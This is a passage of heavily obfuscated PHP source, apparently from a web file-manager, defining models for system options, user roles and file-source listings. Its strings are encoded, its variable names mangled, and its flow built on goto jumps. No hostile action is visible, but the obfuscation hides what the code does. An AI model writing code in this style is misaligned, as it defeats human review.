$GLOBALS[$üÛ²Æ¢[6]][$üÛ²Æ¢[89]][$üÛ²Æ¢[816]]; if (!mk_dir($êŸÅ” õ) || !is_writable($êŸÅ” õ) || !IO::mkfile($êŸÅ” õ . $üÛ²Æ¢[817])) { $êŸÅ” õ = TEMP_FILES; } } return $êŸÅ” õ; } } goto F—ñĞö‚–è; A«›‘šƒ§¢: class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\x79\163\x74\x65\x6d\x5f\157\160\x74\151\157\x6e"; protected $jsonField = array("\x6d\145\x6e\x75", "\x72\157\x6c\x65", "\x72\157\154\145\107\x72\157\165\160", "\x72\x65\147\x69\163\x74", "\x65\155\x61\151\154"); function __construct() { parent::__construct(); } protected function cacheKey($ĞÜÇ‡’­) { return "\x53\x79\x73\x74\x65\x6d\117\160\x74\x69\x6f\x6e\x5f{$ĞÜÇ‡’­}"; } protected function optionDefault($óÏèÇ¡ = '') { $ù£ïÜ§õ =& $_SERVER[³·—™¤¢]; if ($óÏèÇ¡ == $ù£ïÜ§õ[12]) { return $GLOBALS[$ù£ïÜ§õ[6]][$ù£ïÜ§õ[381]]; } } } class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\x65\155\x2e\162\157\x6c\145\x4c\151\x73\x74"; public $field = array("\156\x61\155\x65", "\141\x75\164\x68", "\x6c\141\142\x65\154", "\144\151\x73\160\x6c\x61\x79", "\x73\x79\x73\164\x65\x6d", "\x64\145\x73\143", "\151\x67\x6e\157\162\x65\x45\x78\x74", "\x69\x67\156\157\162\145\x46\151\154\x65\123\x69\172\x65", "\x61\x64\155\x69\156\151\x73\x74\x72\x61\x74\x6f\162", "\x73\157\162\164"); public function listData($­ ÌˆÓŠ = false, $©‚«‘òê = "\163\157\162\164", $—ÆÅæ³Æ = false) { $¾€İ³“ =& $_SERVER[³·—™¤¢]; $â¡Œ·âì = parent::listData($­ ÌˆÓŠ, $©‚«‘òê, $—ÆÅæ³Æ); if (!$­ ÌˆÓŠ) { foreach ($â¡Œ·âì as $’Øç => $Ö”§öíš) { if ($Ö”§öíš[$¾€İ³“[2050]] == 1) { $â¡Œ·âì[$’Øç][$¾€İ³“[453]] = LNG($¾€İ³“[2284]); } } } return $â¡Œ·âì; } public function update($„¥÷†, $ÂØæßéÛ) { $Óò“ÏÆÀ =& $_SERVER[³·—™¤¢]; $—óú¶Ğç = parent::listData($„¥÷†); $Àûèµ¹ = $this->findByName($ÂØæßéÛ[$Óò“ÏÆÀ[32]]); if (!$—óú¶Ğç || $Àûèµ¹ && $Àûèµ¹[$Óò“ÏÆÀ[399]] != $—óú¶Ğç[$Óò“ÏÆÀ[399]]) { return !1; } if ($Àûèµ¹[$Óò“ÏÆÀ[2050]] == 1) { $ÂØæßéÛ = array($Óò“ÏÆÀ[32] => $ÂØæßéÛ[$Óò“ÏÆÀ[32]], $Óò“ÏÆÀ[1875] => $ÂØæßéÛ[$Óò“ÏÆÀ[1875]]); } $this->filterAuth($ÂØæßéÛ[$Óò“ÏÆÀ[413]]); return parent::update($„¥÷†, $ÂØæßéÛ); } public function remove($Ä§Äâí) { $Òèãñ¶õ = parent::listData($Ä§Äâí); if (!$Òèãñ¶õ || $Òèãñ¶õ[$_SERVER[³·—™¤¢][1299]]) { return !1; } return parent::remove($Ä§Äâí); } public function add($×ßÍ÷ëğ) { $†ÄæÍÇ½ =& $_SERVER[³·—™¤¢]; $ÜáÛ× = $×ßÍ÷ëğ[$†ÄæÍÇ½[32]]; if ($this->findByName($ÜáÛ×)) { return !1; } $¨Ÿ¾˜® = array($†ÄæÍÇ½[420] => $ÜáÛ×, $†ÄæÍÇ½[1858] => $†ÄæÍÇ½[12], $†ÄæÍÇ½[1854] => $†ÄæÍÇ½[1862], $†ÄæÍÇ½[2285] => 1, $†ÄæÍÇ½[1857] => 0, $†ÄæÍÇ½[2286] => 0, $†ÄæÍÇ½[1856] => $this->getSort()); $×ßÍ÷ëğ = array_merge($¨Ÿ¾˜®, $×ßÍ÷ëğ); $this->filterAuth($×ßÍ÷ëğ[$†ÄæÍÇ½[413]]); return parent::insert($×ßÍ÷ëğ); } private function getSort() { $ÑëŞ½¿¹ =& $_SERVER[³·—™¤¢]; $ı‘Íäú = parent::listData(); $ÙÒã«¤ = array_to_keyvalue($ı‘Íäú, $ÑëŞ½¿¹[12], $ÑëŞ½¿¹[1876]); return empty($ÙÒã«¤) ? 0 : max($ÙÒã«¤) + 1; } private function filterAuth(&$üã‹ığ) { $òìıóûí =& $_SERVER[³·—™¤¢]; $ÕÂÈ‚» = array(); $ß¬ëà²º = array_filter(explode($òìıóûí[50], $üã‹ığ)); foreach ($ß¬ëà²º as $üã‹ığ) { $Îã“¤¡Ò = explode($òìıóûí[10], $üã‹ığ); if ($Îã“¤¡Ò[0] == $òìıóûí[2287] && $Îã“¤¡Ò[1] != $òìıóûí[1218]) { $Èè¿÷Ò§ = $Îã“¤¡Ò[0] . $òìıóûí[10] . $Îã“¤¡Ò[1] . $òìıóûí[2288]; if (!in_array($Èè¿÷Ò§, $ß¬ëà²º)) { $ÕÂÈ‚»[] = $Èè¿÷Ò§; } } $ÕÂÈ‚»[] = $üã‹ığ; } $üã‹ığ = implode($òìıóûí[50], $ÕÂÈ‚»); } public function findRoleDefault() { $Õ‹É’Å =& $_SERVER[³·—™¤¢]; $ÖİŒ²Î = parent::listData(); $Èïû£ì = !1; foreach ($ÖİŒ²Î as $·¿¡ÌŞ²) { if (!$·¿¡ÌŞ² || $·¿¡ÌŞ²[$Õ‹É’Å[1874]] == $Õ‹É’Å[197] || $·¿¡ÌŞ²[$Õ‹É’Å[2050]] == 1) { continue; } if (strstr($·¿¡ÌŞ²[$Õ‹É’Å[413]], $Õ‹É’Å[2289])) { continue; } if (!strstr($·¿¡ÌŞ²[$Õ‹É’Å[413]], $Õ‹É’Å[2290])) { continue; } if (!$Èïû£ì) { $Èïû£ì = $·¿¡ÌŞ²; continue; } $ÙÜ•¶‰¢ = explode($Õ‹É’Å[50], $Èïû£ì[$Õ‹É’Å[413]]); $Û‡çÄ¯Ö = explode($Õ‹É’Å[50], $·¿¡ÌŞ²[$Õ‹É’Å[413]]); if (count($ÙÜ•¶‰¢) > count($Û‡çÄ¯Ö)) { $Èïû£ì = $·¿¡ÌŞ²; } } return $Èïû£ì ? $Èïû£ì[$Õ‹É’Å[399]] : $Õ‹É’Å[12]; } public function sort($ë×ÖÌËÛ, $×Ó½Ğ²Ğ) { return parent::update($ë×ÖÌËÛ, $×Ó½Ğ²Ğ); } } goto D¥ƒ–´ßÜî; F˜¼©ãåÖâ: class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($¢‰ª´«å = false, $ÔÏš¬Æ = '', $¨×³Ç¾Î = false) { $øïñ¹ÚÇ =& $_SERVER[³·—™¤¢]; $à°²¿® = $this->cacheGet($ÔÏš¬Æ); $ÈÁÁ–ª‘ = $this->optionDefault($ÔÏš¬Æ); $ÈÁÁ–ª‘ = is_array($ÈÁÁ–ª‘) ? $ÈÁÁ–ª‘ : array(); if (is_array($à°²¿®)) { $à°²¿® = array_merge($ÈÁÁ–ª‘, $à°²¿®); return $¢‰ª´«å ? isset($à°²¿®[$¢‰ª´«å]) ? $à°²¿®[$¢‰ª´«å] : null : $à°²¿®; } $÷ĞŒı„Ó = $this->filterWhere(array($øïñ¹ÚÇ[33] => $ÔÏš¬Æ)); $à°²¿® = $this->where($÷ĞŒı„Ó)->select(); $à°²¿® = array_to_keyvalue($à°²¿®, $øïñ¹ÚÇ[94], $øïñ¹ÚÇ[374]); foreach ($à°²¿® as $•Ğ‹ó«Ò => $÷™µ¬Óš) { if ($¨×³Ç¾Î || in_array($•Ğ‹ó«Ò, $this->jsonField)) { $à°²¿®[$•Ğ‹ó«Ò] = json_decode($÷™µ¬Óš, !0); } } $this->cacheSet($ÔÏš¬Æ, $à°²¿®); $à°²¿® = array_merge($ÈÁÁ–ª‘, $à°²¿®); return $¢‰ª´«å ? $à°²¿®[$¢‰ª´«å] : $à°²¿®; } public function set($‹Ò†§îÑ, $–Å…ßÙ = false, $ ³®ûÓõ = '') { $â‘‰‰ª· =& $_SERVER[³·—™¤¢]; $this->cacheRemove($ ³®ûÓõ); $¢•ôßÇ± = array(); $ĞÍ–çŠ = is_array($‹Ò†§îÑ) ? $‹Ò†§îÑ : array($‹Ò†§îÑ => $–Å…ßÙ); foreach ($ĞÍ–çŠ as $ß½âÊı³ => $Ì‡Íšë×) { if (is_array($Ì‡Íšë×)) { $Ì‡Íšë× = json_encode_force($Ì‡Íšë×); } $this->checkLength($Ì‡Íšë×, !1, $this->tableName . $â‘‰‰ª·[4] . $‹Ò†§îÑ); $Ì‡Íšë× = self::textEncode($Ì‡Íšë×); $ĞÍ–çŠ = array($â‘‰‰ª·[33] => $ ³®ûÓõ, $â‘‰‰ª·[94] => $ß½âÊı³, $â‘‰‰ª·[374] => $Ì‡Íšë×); $¢•ôßÇ±[] = $this->filterWhere($ĞÍ–çŠ); } if (!$¢•ôßÇ±) { return !0; } $®ÙÎÎøû = $this->cacheKey($â‘‰‰ª·[400]); CacheLock::lock($®ÙÎÎøû); $åêŒ¹Ø = $this->addAll($¢•ôßÇ±, array(), !0); CacheLock::unlock($®ÙÎÎøû); return $åêŒ¹Ø; } protected function optionDefault($«”©Ò‹Ü = '') { return !1; } public function setDeep($Û¤Ú ö˜, $êş½°İ = false, $ô‡üƒÈÁ = '') { $½œ†¯§ = explode($_SERVER[³·—™¤¢][10], $Û¤Ú ö˜); $’íî®°¤ = $this->get(); array_set_value($’íî®°¤, $Û¤Ú ö˜, $êş½°İ); $this->set($½œ†¯§[0], $’íî®°¤[$½œ†¯§[0]], $ô‡üƒÈÁ); } public function remove($Æ¹‘ùóÈ, $Şü¼ËÉ¦ = '') { $òü«¼óİ =& $_SERVER[³·—™¤¢]; $this->cacheRemove($Şü¼ËÉ¦); $áàáÜÃÈ = $this->filterWhere(array($òü«¼óİ[94] => $Æ¹‘ùóÈ, $òü«¼óİ[33] => $Şü¼ËÉ¦)); if (is_null($Æ¹‘ùóÈ)) { unset($áàáÜÃÈ[$òü«¼óİ[94]]); } return $this->where($áàáÜÃÈ)->delete(); } public function cacheSet($Ãùıù¸¿, $ıãâóÇà = false) { return Cache::set($this->cacheKey($Ãùıù¸¿), $ıãâóÇà); } public function cacheGet($ˆÌ…ÃÁÅ) { return Cache::get($this->cacheKey($ˆÌ…ÃÁÅ)); } public function cacheRemove($“ÇÊ›˜Õ) { return Cache::remove($this->cacheKey($“ÇÊ›˜Õ)); } protected function filterWhere($¨Üê¥é) { return $¨Üê¥é; } protected function cacheKey($®ô¥Şúá) { return $®ô¥Şúá; } } class SourceListModel extends ModelBase { protected $tableName = "\x69\x6f\137\163\157\x75\x72\143\x65"; protected $tableMeta = array("\164\x61\142\x6c\x65\116\141\155\x65" => "\151\157\137\x73\157\x75\162\x63\x65\137\155\x65\x74\141", "\155\x65\164\141\106\x69\145\x6c\144" => "\163\157\x75\162\x63\145\x49\104"); protected $dataAuto = array(array("\155\x6f\x64\x69\x66\x79\x54\151\x6d\145", "\164\x69\x6d\x65", "\151\156\x73\x65\162\x74", "\x66\165\x6e\143\x74\151\x6f\156"), array("\x63\x72\x65\141\x74\x65\x54\151\x6d\145", "\x74\x69\155\x65", "\x69\156\x73\x65\x72\164", "\146\165\x6e\143\164\151\x6f\156"), array("\166\x69\x65\167\x54\x69\155\x65", "\164\151\155\145", "\x69\x6e\x73\x65\x72\164", "\x66\165\x6e\143\x74\151\157\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($ÀóˆÓõà) { return $this->listSource(array($_SERVER[³·—™¤¢][401] => $ÀóˆÓõà)); } public function typeName($ãÊéËå©) { static $Ü×£ÚûĞ = array(self::TYPE_SYSTEM => "\163\171\163\x74\145\155", self::TYPE_USER => "\x75\x73\x65\162", self::TYPE_GROUP => "\x67\162\157\165\160"); return $Ü×£ÚûĞ[$ãÊéËå© . $_SERVER[³·—™¤¢][12]]; } public function sourceListInfo($°èÀ¤ø¿, $óÓ—©¦ = false) { $èâõµŠ¬ =& $_SERVER[³·—™¤¢]; $°èÀ¤ø¿ = $°èÀ¤ø¿ ? $°èÀ¤ø¿ : array(); $°èÀ¤ø¿ = array_filter(array_unique($°èÀ¤ø¿)); if (!$°èÀ¤ø¿) { return array(); } $«Ñ›„¢ = $this->where(array($èâõµŠ¬[402] => array($èâõµŠ¬[7], $°èÀ¤ø¿)))->select(); $this->_listDataApply($«Ñ›„¢, $óÓ—©¦); return array_to_keyvalue($«Ñ›„¢, $èâõµŠ¬[402]); } public function pathInfoFilter(&$¦¡™³¤‰) { $±ïÁÚÓ› =& $_SERVER[³·—™¤¢]; static $´Â±šÕ = false; static $÷½í®û = false; static $âÀ¾Èøå = false; if (!$´Â±šÕ) { $ùíŒ™£é = $±ïÁÚÓ›[403]; $ùíŒ™£é .= $±ïÁÚÓ›[404]; $ùíŒ™£é .= $±ïÁÚÓ›[405]; $»òœêê = $±ïÁÚÓ›[406]; $Î§ìŒ… = explode($±ïÁÚÓ›[50], $»òœêê); $´Â±šÕ = explode($±ïÁÚÓ›[50], $ùíŒ™£é); $÷½í®û = array(); foreach ($´Â±šÕ as $Øª¬…Ãò) { if (in_array($Øª¬…Ãò, $Î§ìŒ…)) { continue; } $÷½í®û[] = $Øª¬…Ãò; } $âÀ¾Èøå = explode($±ïÁÚÓ›[50], $±ïÁÚÓ›[407]); } foreach ($âÀ¾Èøå as $ˆ—÷ê›Ö) { if (isset($¦¡™³¤‰[$ˆ—÷ê›Ö])) { $¦¡™³¤‰[$ˆ—÷ê›Ö] = intval($¦¡™³¤‰[$ˆ—÷ê›Ö]); } } $¦¡™³¤‰[$±ïÁÚÓ›[84]] = $±ïÁÚÓ›[408] . $¦¡™³¤‰[$±ïÁÚÓ›[402]] . $±ïÁÚÓ›[409]; $¦¡™³¤‰[$±ïÁÚÓ›[33]] = $¦¡™³¤‰[$±ïÁÚÓ›[410]] == 1 ? $±ïÁÚÓ›[75] : $±ïÁÚÓ›[199]; $¦¡™³¤‰[$±ïÁÚÓ›[411]] = $this->typeName($¦¡™³¤‰[$±ïÁÚÓ›[411]]); if ($¦¡™³¤‰[$±ïÁÚÓ›[410]] != 1) { $¦¡™³¤‰[$±ïÁÚÓ›[174]] = $¦¡™³¤‰[$±ïÁÚÓ›[412]]; unset($¦¡™³¤‰[$±ïÁÚÓ›[412]]); } $´óø­Ì = $´Â±šÕ; if (isset($¦¡™³¤‰[$±ïÁÚÓ›[413]]) && $¦¡™³¤‰[$±ïÁÚÓ›[413]][$±ïÁÚÓ›[414]] == -1) { $´óø­Ì = $÷½í®û; } $¦¡™³¤‰ = array_field_key($¦¡™³¤‰, $´óø­Ì); return $¦¡™³¤‰; } public function listUserFav() { $èÎö†ÖÅ =& $_SERVER[³·—™¤¢]; $¨†ò‘Œ = Model($èÎö†ÖÅ[415])->listData(); $€İãëö‚ = array_filter_by_field($¨†ò‘Œ, $èÎö†ÖÅ[33], $èÎö†ÖÅ[416]); $€İãëö‚ = array_to_keyvalue($€İãëö‚, $èÎö†ÖÅ[12], $èÎö†ÖÅ[84]); if ($€İãëö‚) { $§şåÍ¬ = $this->listSource(array($èÎö†ÖÅ[417] => array($èÎö†ÖÅ[418], $€İãëö‚))); } $§şåÍ¬ = array_to_keyvalue($§şåÍ¬[$èÎö†ÖÅ[369]], $èÎö†ÖÅ[402]); foreach ($¨†ò‘Œ as &$úœŠÃ™) { $úœŠÃ™ = array($èÎö†ÖÅ[419] => $úœŠÃ™[$èÎö†ÖÅ[399]], $èÎö†ÖÅ[420] => $úœŠÃ™[$èÎö†ÖÅ[32]], $èÎö†ÖÅ[421] => $úœŠÃ™[$èÎö†ÖÅ[84]], $èÎö†ÖÅ[422] => $úœŠÃ™[$èÎö†ÖÅ[33]], $èÎö†ÖÅ[423] => $úœŠÃ™[$èÎö†ÖÅ[200]], $èÎö†ÖÅ[424] => $úœŠÃ™[$èÎö†ÖÅ[85]]); if ($úœŠÃ™[$èÎö†ÖÅ[33]] == $èÎö†ÖÅ[416] && $§şåÍ¬[$úœŠÃ™[$èÎö†ÖÅ[84]]]) { $úœŠÃ™[$èÎö†ÖÅ[86]] = $§şåÍ¬[$úœŠÃ™[$èÎö†ÖÅ[84]]]; } } unset($úœŠÃ™); return $¨†ò‘Œ; } public function listUserTag($ŒôÜ¿œô) { $¸›Š½» =& $_SERVER[³·—™¤¢]; if ($ŒôÜ¿œô && !is_array($ŒôÜ¿œô)) { $ŒôÜ¿œô = array($ŒôÜ¿œô); } $ğ„»­»ü = Model($¸›Š½»[425])->listData(); $²êó»ÕÇ = array(); $ñ»ùÊÛ¦ = array(); foreach ($ğ„»­»ü as $ÂüúÇğ) { $¾Äîş’  = $ÂüúÇğ[$¸›Š½»[84]]; if (!$¾Äîş’ ) { continue; } if (!isset($ñ»ùÊÛ¦[$¾Äîş’ ])) { $ñ»ùÊÛ¦[$¾Äîş’ ] = array(); } $ñ»ùÊÛ¦[$¾Äîş’ ][] = $ÂüúÇğ[$¸›Š½»[426]]; $²êó»ÕÇ[$ÂüúÇğ[$¸›Š½»[84]]] = $ÂüúÇğ; } $…ŠôÉµ– = array(); $åÅÈÕ—¥ = array(); $«¸ÌÉ¢ = array(); foreach ($ñ»ùÊÛ¦ as $ç“Œá…Ÿ => $ğŒ¤ƒ¬) { $ÎÃå±Ñ® = !0; if (!$ŒôÜ¿œô) { $…ŠôÉµ–[] = $ç“Œá…Ÿ; continue; } foreach ($ŒôÜ¿œô as $·ºÜèÑà) { if (!in_array($·ºÜèÑà, $ğŒ¤ƒ¬)) { $ÎÃå±Ñ® = !1; break; } } if (!$ÎÃå±Ñ®) { continue; } if (!is_numeric($ç“Œá…Ÿ)) { $ßÇ“Ä½Ú = $²êó»ÕÇ[$ç“Œá…Ÿ]; $…ñŠµûˆ = array($¸›Š½»[32] => $ßÇ“Ä½Ú[$¸›Š½»[32]], $¸›Š½»[84] => $ßÇ“Ä½Ú[$¸›Š½»[84]], $¸›Š½»[33] => $ßÇ“Ä½Ú[$¸›Š½»[33]], $¸›Š½»[86] => array($¸›Š½»[427] => 1), $¸›Š½»[201] => !0); if ($ßÇ“Ä½Ú[$¸›Š½»[33]] == $¸›Š½»[199]) { $«¸ÌÉ¢[] = $…ñŠµûˆ; } if ($ßÇ“Ä½Ú[$¸›Š½»[33]] == $¸›Š½»[75]) { $åÅÈÕ—¥[] = $…ñŠµûˆ; } continue; } $…ŠôÉµ–[] = $ç“Œá…Ÿ; } if ($…ŠôÉµ–) { $„Õ°ó = $this->listSource(array($¸›Š½»[417] => array($¸›Š½»[418], $…ŠôÉµ–))); } $„Õ°ó = $„Õ°ó ? $„Õ°ó : array($¸›Š½»[82] => array(), $¸›Š½»[83] => array()); $„Õ°ó[$¸›Š½»[82]] = array_merge($„Õ°ó[$¸›Š½»[82]], $åÅÈÕ—¥); $„Õ°ó[$¸›Š½»[83]] = array_merge($„Õ°ó[$¸›Š½»[83]], $«¸ÌÉ¢); if (isset($„Õ°ó[$¸›Š½»[366]]) && count($…ŠôÉµ–) == $„Õ°ó[$¸›Š½»[366]][$¸›Š½»[367]]) { return $„Õ°ó; } $ËıŞÜõû = array(); $Õ¡ğ¡Ò = array_to_keyvalue($„Õ°ó[$¸›Š½»[82]], $¸›Š½»[12], $¸›Š½»[402]); $©ĞŠáøŠ = array_to_keyvalue($„Õ°ó[$¸›Š½»[83]], $¸›Š½»[12], $¸›Š½»[402]); $’’ª—Ğ™ = array_merge($©ĞŠáøŠ, $Õ¡ğ¡Ò); foreach ($…ŠôÉµ– as $¾Äîş’ ) { if (!in_array($¾Äîş’ , $’’ª—Ğ™)) { $ËıŞÜõû[] = $¾Äîş’ ; } } if ($ËıŞÜõû) { Model($¸›Š½»[428])->removeBySource($ËıŞÜõû); } return $„Õ°ó; } public function listUserRecycle() { $¯¿ƒ·Òª =& $_SERVER[³·—™¤¢]; $ˆ³ù‡ç÷ = Model($¯¿ƒ·Òª[429])->listData(); if (!$ˆ³ù‡ç÷) { return array(); } $ºö“£“ = array($¯¿ƒ·Òª[417] => array($¯¿ƒ·Òª[418], $ˆ³ù‡ç÷), $¯¿ƒ·Òª[430] => 1); return $this->listSource($ºö“£“); } public function listSource($¾Øµï´×, $Å×¶äÙ€ = 3000, $²¯€Ç¯ë = false) { $À—ãªÈ =& $_SERVER[³·—™¤¢]; if (!isset($¾Øµï´×[$À—ãªÈ[431]])) { $¾Øµï´×[$À—ãªÈ[431]] = 0; } if (isset($¾Øµï´×[$À—ãªÈ[432]]) && $¾Øµï´×[$À—ãªÈ[432]] == $À—ãªÈ[197]) { $¾Øµï´×[$À—ãªÈ[412]] = array($À—ãªÈ[331], $À—ãªÈ[433]); } $¤ŠØŒ’ì = $À—ãªÈ[434]; $Ô¹™ü£š = $this->field($¤ŠØŒ’ì)->_makeOrder()->where($¾Øµï´×)->selectPage($Å×¶äÙ€); $this->_listPageCheck($Ô¹™ü£š, $¤ŠØŒ’ì, $¾Øµï´×); $this->_listDataApply($Ô¹™ü£š[$À—ãªÈ[369]], $²¯€Ç¯ë); $this->_listMake($Ô¹™ü£š); return $Ô¹™ü£š; } private function _listPageCheck(&$´øñÓ­, $’¸€‡¶, $³üøÈ¤¿) { $“©çªø =& $_SERVER[³·—™¤¢]; if (!is_array($´øñÓ­[$“©çªø[366]])) { return; } $ÜòêÖ• = $´øñÓ­[$“©çªø[366]]; if ($ÜòêÖ•[$“©çªø[368]] <= 1) { return; } if ($ÜòêÖ•[$“©çªø[367]] >= 100000) { return; } if (Model($“©çªø[435])->get($“©çªø[436]) != $“©çªø[437]) { return; } $’¸€‡¶ = str_replace(array($“©çªø[53], $“©çªø[342], $“©çªø[231]), $“©çªø[12], $’¸€‡¶); $’¸€‡¶ = $“©çªø[438] . str_replace($“©çªø[50], $“©çªø[439], $’¸€‡¶) . $“©çªø[440]; $ŞÛšˆ¿„ = $“©çªø[441]; $ŞÛšˆ¿„ = $ŞÛšˆ¿„ . $“©çªø[442]; $€íÂó± = $ÜòêÖ•[$“©çªø[363]] * ($ÜòêÖ•[$“©çªø[353]] - 1) . $“©çªø[50] . $ÜòêÖ•[$“©çªø[363]]; $†‰ÈŠ¸¢ = $this->_makeOrder(!0); $æ¶•ĞõÜ = $“©çªø[438] . str_replace($“©çªø[50], $“©çªø[439], $†‰ÈŠ¸¢[0]); if (strpos($æ¶•ĞõÜ, $“©çªø[443])) { $æ¶•ĞõÜ = str_replace($“©çªø[443], $“©çªø[444], $æ¶•ĞõÜ); } else { $æ¶•ĞõÜ .= $“©çªø[445] . $†‰ÈŠ¸¢[1]; } $ŞÄ¸…¡ = array(); foreach ($³üøÈ¤¿ as $ËØª€Üã => $ùèÅ£“Ø) { $ŞÄ¸…¡[$“©çªø[438] . $ËØª€Üã] = $ùèÅ£“Ø; } $this->alias($“©çªø[446])->field($’¸€‡¶)->limit($€íÂó±)->order($æ¶•ĞõÜ); $Ğ½İ¯­¯ = $this->join($ŞÛšˆ¿„)->where($ŞÄ¸…¡)->select(); if ($Ğ½İ¯­¯) { $´øñÓ­[$“©çªø[369]] = $Ğ½İ¯­¯; } } protected function _makeOrder($·Ùíèè¼ = false) { $ğ‹Ğäæ¶ =& $_SERVER[³·—™¤¢]; $¨ÃÁüÚĞ = Model($ğ‹Ğäæ¶[447])->get($ğ‹Ğäæ¶[448]); $üÈ½öŸ§ = Model($ğ‹Ğäæ¶[447])->get($ğ‹Ğäæ¶[449]); $Ëº´Û£á = array($ğ‹Ğäæ¶[450] => $ğ‹Ğäæ¶[451], $ğ‹Ğäæ¶[452] => $ğ‹Ğäæ¶[453]); $ĞÅ­Üœ‘ = array($ğ‹Ğäæ¶[32] => $ğ‹Ğäæ¶[32], $ğ‹Ğäæ¶[76] => $ğ‹Ğäæ¶[76], $ğ‹Ğäæ¶[174] => $ğ‹Ğäæ¶[412], $ğ‹Ğäæ¶[454] => $ğ‹Ğäæ¶[454], $ğ‹Ğäæ¶[455] => $ğ‹Ğäæ¶[456], $ğ‹Ğäæ¶[200] => $ğ‹Ğäæ¶[200], $ğ‹Ğäæ¶[85] => $ğ‹Ğäæ¶[85]); $íÒº—ƒ = Input::get($ğ‹Ğäæ¶[457], $ğ‹Ğäæ¶[7], $¨ÃÁüÚĞ, array_keys($ĞÅ­Üœ‘)); $»§ô£­ = Input::get($ğ‹Ğäæ¶[458], $ğ‹Ğäæ¶[7], $üÈ½öŸ§, array_keys($Ëº´Û£á)); if (!in_array($íÒº—ƒ, array_keys($ĞÅ­Üœ‘))) { $íÒº—ƒ = $ğ‹Ğäæ¶[32]; } if (!in_array($»§ô£­, array_keys($Ëº´Û£á))) { $íÒº—ƒ = $ğ‹Ğäæ¶[450]; } if ($íÒº—ƒ == $ğ‹Ğäæ¶[32]) { } $„¥Öª‘‰ = $ğ‹Ğäæ¶[459] . $ĞÅ­Üœ‘[$íÒº—ƒ] . $ğ‹Ğäæ¶[53] . $Ëº´Û£á[$»§ô£­]; $„¥Öª‘‰ = rtrim(trim($„¥Öª‘‰), $ğ‹Ğäæ¶[50]); if ($·Ùíèè¼) { return array($„¥Öª‘‰, $Ëº´Û£á[$»§ô£­]); } return $this->order($„¥Öª‘‰); } protected function _listDataApplyItem($ğÈüóî…, $Ö°İ¹ôš = false) { $ÂÆ•çìô = array($ğÈüóî…); $this->_listDataApply($ÂÆ•çìô, $Ö°İ¹ôš); return $ÂÆ•çìô[0]; } protected function _listDataApply(&$ƒèŸã˜î, $ª÷†˜Ü = false) { $ŠåÂ•Ó¿ =& $_SERVER[³·—™¤¢]; if (!$ƒèŸã˜î) { $ƒèŸã˜î = array(); return; } $ñ¦šƒ¤¡ = array_to_keyvalue($ƒèŸã˜î, $ŠåÂ•Ó¿[12], $ŠåÂ•Ó¿[402]); $ñ¦šƒ¤¡ = array_unique($ñ¦šƒ¤¡); $this->_listSourceCache($ƒèŸã˜î); if (!$ª÷†˜Ü) { $this->_listAppendMeta($ƒèŸã˜î, $ñ¦šƒ¤¡); $this->_listAppendFileMeta($ƒèŸã˜î, $ñ¦šƒ¤¡); $this->_listAppendChildren($ƒèŸã˜î, $ñ¦šƒ¤¡); } $this->_listAppendPath($ƒèŸã˜î); $this->_listAppendAuth($ƒèŸã˜î); $this->_listAppendSourceInfo($ƒèŸã˜î, $ñ¦šƒ¤¡); $this->_listAppendUser($ƒèŸã˜î); $this->_listFilterInfo($ƒèŸã˜î, $ª÷†˜Ü); $this->_listAppendAuthSecret($ƒèŸã˜î); } protected function _listSourceCache($À–ÂûÒî) { $‹Ü®Öú =& $_SERVER[³·—™¤¢]; foreach ($À–ÂûÒî as $ÛÓë¤ÕÄ) { self::$cacheSourceInfo[$‹Ü®Öú[460] . $ÛÓë¤ÕÄ[$‹Ü®Öú[402]]] = $ÛÓë¤ÕÄ; } } protected function _listFilterInfo(&$Ëñöíõ¦, $İ˜ »Ç¥ = false) { $åĞ¨Ô• =& $_SERVER[³·—™¤¢]; foreach ($Ëñöíõ¦ as &$çÃÏŸÙ½) { $çÃÏŸÙ½ = $this->pathInfoFilter($çÃÏŸÙ½); self::$cachePathInfo[$åĞ¨Ô•[461] . intval($İ˜ »Ç¥) . $åĞ¨Ô•[386] . $çÃÏŸÙ½[$åĞ¨Ô•[402]]] = $çÃÏŸÙ½; } unset($çÃÏŸÙ½); } protected function _listMake(&$À©çá„ü) { $‡×È›ş =& $_SERVER[³·—™¤¢]; $À©çá„ü[$‡×È›ş[82]] = array(); $À©çá„ü[$‡×È›ş[83]] = array(); foreach ($À©çá„ü[$‡×È›ş[369]] as $Û†Ô¹ ) { $‡²Äıı = $Û†Ô¹ [$‡×È›ş[410]] == 1 ? $‡×È›ş[82] : $‡×È›ş[83]; $À©çá„ü[$‡²Äıı][] = $Û†Ô¹ ; } unset($À©çá„ü[$‡×È›ş[369]]); } protected function _listAppendMeta(&$ƒÛÈí‹», $ñı´ƒ¿â) { $…‰ê­§ =& $_SERVER[³·—™¤¢]; $ÍŠŞ¢± = array($…‰ê­§[417] => array($…‰ê­§[418], $ñı´ƒ¿â)); $³¦Û­· = Model($…‰ê­§[462])->field($…‰ê­§[463])->where($ÍŠŞ¢±)->select(); if (!$³¦Û­·) { return; } $ŒÙãÇ¶½ = array($…‰ê­§[464], $…‰ê­§[465], $…‰ê­§[444]); $Œ‰æ¢íÁ = array(); foreach ($³¦Û­· as $£°ÖŠ) { if (!isset($Œ‰æ¢íÁ[$£°ÖŠ[$…‰ê­§[402]]])) { $Œ‰æ¢íÁ[$£°ÖŠ[$…‰ê­§[402]]] = array(); } if (in_array($£°ÖŠ[$…‰ê­§[94]], $ŒÙãÇ¶½)) { continue; } $Œ‰æ¢íÁ[$£°ÖŠ[$…‰ê­§[402]]][$£°ÖŠ[$…‰ê­§[94]]] = $£°ÖŠ[$…‰ê­§[374]]; } foreach ($ƒÛÈí‹» as &$¶ÅœàÅë) { $¶ÅœàÅë[$…‰ê­§[466]] = !1; if (isset($Œ‰æ¢íÁ[$¶ÅœàÅë[$…‰ê­§[402]]])) { $¶ÅœàÅë[$…‰ê­§[466]] = $Œ‰æ¢íÁ[$¶ÅœàÅë[$…‰ê­§[402]]]; } if ($this->fileIsLock($¶ÅœàÅë) && $¶ÅœàÅë[$…‰ê­§[413]]) { $¥ŠÆ×ğÑ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; 